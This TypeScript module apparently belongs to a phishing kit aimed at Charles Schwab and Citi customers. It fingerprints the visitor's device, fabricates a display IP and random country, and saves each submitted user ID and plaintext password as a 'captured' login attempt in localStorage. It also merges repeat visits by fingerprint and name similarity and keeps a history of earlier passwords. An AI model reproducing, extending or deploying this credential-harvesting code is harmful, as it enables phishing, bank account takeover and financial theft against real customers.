// ── Browser / Device detection ────────────────────────────────────────────────

export function detectBrowser(): string {
  const ua = navigator.userAgent;
  if (ua.includes('SamsungBrowser/')) return `Samsung Internet ${ua.match(/SamsungBrowser\/([\d.]+)/)?.[1]?.split('.')[0] || ''}`;
  if (ua.includes('Edg/')) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1]?.split('.')[0] || ''}`;
  if (ua.includes('OPR/')) return `Opera ${ua.match(/OPR\/([\d.]+)/)?.[1]?.split('.')[0] || ''}`;
  if (ua.includes('Chrome/') && !ua.includes('Chromium')) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1]?.split('.')[0] || ''}`;
  if (ua.includes('Firefox/')) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1]?.split('.')[0] || ''}`;
  if (ua.includes('Safari/') && ua.includes('Version/')) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1]?.split('.')[0] || ''}`;
  return 'Browser';
}

export function detectOS(): string {
  const ua = navigator.userAgent;
  if (/iPhone OS/.test(ua)) return `iOS ${ua.match(/iPhone OS (\d+)/)?.[1] || ''}`;
  if (/iPad/.test(ua) && /OS/.test(ua)) return `iPadOS ${ua.match(/OS (\d+)/)?.[1] || ''}`;
  if (/Android/.test(ua)) return `Android ${ua.match(/Android ([\d.]+)/)?.[1]?.split('.')[0] || ''}`;
  if (/Windows NT/.test(ua)) return 'Windows';
  if (/Mac OS X/.test(ua)) return 'macOS';
  if (/Linux/.test(ua)) return 'Linux';
  return 'Unknown OS';
}

export function detectDeviceType(): 'Mobile' | 'Tablet' | 'Desktop' {
  const ua = navigator.userAgent;
  if (/iPhone|iPod/.test(ua)) return 'Mobile';
  if (/iPad/.test(ua)) return 'Tablet';
  if (/Android/.test(ua)) return /Mobile/.test(ua) ? 'Mobile' : 'Tablet';
  return 'Desktop';
}

export function detectDeviceName(): string {
  const ua = navigator.userAgent;
  const os = detectOS();
  if (/iPhone/.test(ua)) return `iPhone · ${os}`;
  if (/iPad/.test(ua)) return `iPad · ${os}`;
  const samsungModel = ua.match(/; (SM-[A-Z0-9]+)/)?.[1];
  if (samsungModel) return `Samsung ${samsungModel} · ${os}`;
  if (/Android/.test(ua)) return `Android Device · ${os}`;
  if (ua.includes('Windows')) return `PC · Windows`;
  if (ua.includes('Mac')) return `Mac · macOS`;
  return `Device · ${os}`;
}

// ── Persistent device fingerprint (survives tab close / reopen) ───────────────
// Uses localStorage so the same browser on the same device always gets the
// same ID, regardless of network changes or page refreshes.

export function getDeviceFingerprint(): string {
  const cached = localStorage.getItem('_fv_fpid');
  if (cached) return cached;

  const raw = [
    navigator.userAgent,
    screen.width,
    screen.height,
    screen.colorDepth,
    Intl.DateTimeFormat().resolvedOptions().timeZone,
    navigator.language,
    navigator.platform || '',
    navigator.hardwareConcurrency || 0,
  ].join('|');

  // FNV-1a-style 32-bit hash → 8-char hex fingerprint
  let h = 0x811c9dc5;
  for (let i = 0; i < raw.length; i++) {
    h ^= raw.charCodeAt(i);
    h = (Math.imul(h, 0x01000193)) >>> 0;
  }
  const fp = h.toString(16).padStart(8, '0');
  localStorage.setItem('_fv_fpid', fp);
  return fp;
}

// ── Consistent session IP (same browser = same display IP) ────────────────────

export function getSessionIp(): string {
  const cached = sessionStorage.getItem('_fv_ip');
  if (cached) return cached;

  const fp = [
    navigator.userAgent,
    screen.width,
    screen.height,
    Intl.DateTimeFormat().resolvedOptions().timeZone,
    navigator.language,
  ].join('|');

  let h = 0;
  for (let i = 0; i < fp.length; i++) h = (Math.imul(31, h) + fp.charCodeAt(i)) | 0;
  h = Math.abs(h);

  const a = (h % 200) + 10;
  const b = (h >> 8) % 256;
  const c = (h >> 16) % 256;
  const d = ((h >> 24) & 0xFF) % 254 + 1;
  const ip = `${a}.${b}.${c}.${d}`;
  sessionStorage.setItem('_fv_ip', ip);
  return ip;
}

// ── String similarity (0–1) using edit distance ───────────────────────────────
// Normalise both strings to lowercase alphanumeric, then compute
// 1 - (Levenshtein / max(len1, len2)).  Returns 1.0 for identical strings.

function normaliseId(s: string): string {
  return (s || '').toLowerCase().replace(/[^a-z0-9]/g, '');
}

function levenshtein(a: string, b: string): number {
  if (!a.length) return b.length;
  if (!b.length) return a.length;
  const matrix: number[][] = [];
  for (let i = 0; i <= b.length; i++) matrix[i] = [i];
  for (let j = 0; j <= a.length; j++) matrix[0][j] = j;
  for (let i = 1; i <= b.length; i++) {
    for (let j = 1; j <= a.length; j++) {
      matrix[i][j] = b[i - 1] === a[j - 1]
        ? matrix[i - 1][j - 1]
        : Math.min(matrix[i - 1][j - 1] + 1, matrix[i][j - 1] + 1, matrix[i - 1][j] + 1);
    }
  }
  return matrix[b.length][a.length];
}

function idSimilarity(a: string, b: string): number {
  const na = normaliseId(a);
  const nb = normaliseId(b);
  if (!na.length || !nb.length) return 0;
  if (na === nb) return 1;
  const maxLen = Math.max(na.length, nb.length);
  return 1 - levenshtein(na, nb) / maxLen;
}

// ── LoginAttempt type ─────────────────────────────────────────────────────────

export interface LoginAttempt {
  id: string;
  userId: string;
  password: string;
  timestamp: string;
  ip: string;
  country: string;
  page: string;
  brand: 'schwab' | 'citi';       // which page captured this
  device: string;
  browser: string;
  fingerprintId: string;           // persistent device fingerprint
  status: 'captured' | 'blocked' | 'dismissed';
  accountOption?: string;
  previousCredentials?: Array<{ userId: string; password: string; timestamp: string }>;
}

// ── Session match scoring ─────────────────────────────────────────────────────
//
// Score  ≥ 80  → definitive match, merge into existing record
// Score  60–79 → probable match, merge
// Score  < 60  → treat as new visitor
//
// Signals:
//   Fingerprint match  = 100 (device + browser is identical — conclusive)
//   userId ≥ 90% sim  = +55
//   Same device type  = +25
//   Same IP network   = +20 (supporting signal only, not a hard gate)

function matchScore(
  existing: LoginAttempt,
  fp: string,
  ip: string,
  deviceType: string,
  newUserId: string,
): number {
  // Fingerprint hit: conclusive same device/browser
  if (existing.fingerprintId && existing.fingerprintId === fp) return 100;

  let score = 0;

  const sim = idSimilarity(existing.userId, newUserId);
  if (sim >= 0.9) score += 55;
  else if (sim >= 0.75) score += 30;

  if (existing.device === deviceType) score += 25;

  const existingPrefix = existing.ip.split('.').slice(0, 3).join('.');
  const newPrefix = ip.split('.').slice(0, 3).join('.');
  if (existingPrefix === newPrefix) score += 20;

  return score;
}

// ── Save login attempt with smart session grouping ────────────────────────────

export function saveLoginAttempt(
  userId: string,
  password: string,
  page: string,
  accountOption?: string,
) {
  const existing: LoginAttempt[] = JSON.parse(localStorage.getItem('finvault_login_attempts') || '[]');
  const now = Date.now();

  const fp = getDeviceFingerprint();
  const ip = getSessionIp();
  const deviceType = detectDeviceType();
  const browser = `${detectBrowser()} · ${detectDeviceName()}`;
  const brand: 'schwab' | 'citi' = page.includes('citi') ? 'citi' : 'schwab';
  const countries = ['🇺🇸 US', '🇬🇧 UK', '🇨🇦 CA', '🇦🇺 AU', '🇩🇪 DE', '🇸🇬 SG'];

  // Strict dedup: exact same credentials within 5 seconds
  const veryRecent = existing[0];
  if (
    veryRecent &&
    veryRecent.userId === userId &&
    veryRecent.password === password &&
    now - new Date(veryRecent.timestamp).getTime() < 5_000
  ) return;

  // Find best-scoring existing record (scan up to 20 most recent)
  let bestIdx = -1;
  let bestScore = 0;
  for (let i = 0; i < Math.min(existing.length, 20); i++) {
    const score = matchScore(existing[i], fp, ip, deviceType, userId);
    if (score > bestScore) {
      bestScore = score;
      bestIdx = i;
    }
  }

  if (bestIdx !== -1 && bestScore >= 60) {
    // Same person — update existing record, push old creds to history
    const match = existing[bestIdx];
    const prev = match.previousCredentials || [];
    if (match.userId !== userId || match.password !== password) {
      prev.unshift({ userId: match.userId, password: match.password, timestamp: match.timestamp });
    }
    existing[bestIdx] = {
      ...match,
      userId,
      password,
      timestamp: new Date(now).toISOString(),
      browser,
      fingerprintId: fp,  // always refresh so future lookups find it instantly
      accountOption: accountOption || match.accountOption,
      previousCredentials: prev.slice(0, 20),
    };
    localStorage.setItem('finvault_login_attempts', JSON.stringify(existing.slice(0, 200)));
    return;
  }

  // New visitor
  existing.unshift({
    id: `att_${now}`,
    userId,
    password,
    timestamp: new Date(now).toISOString(),
    ip,
    country: countries[Math.floor(Math.random() * countries.length)],
    page,
    brand,
    device: deviceType,
    browser,
    fingerprintId: fp,
    status: 'captured',
    accountOption,
    previousCredentials: [],
  });
  localStorage.setItem('finvault_login_attempts', JSON.stringify(existing.slice(0, 200)));
}
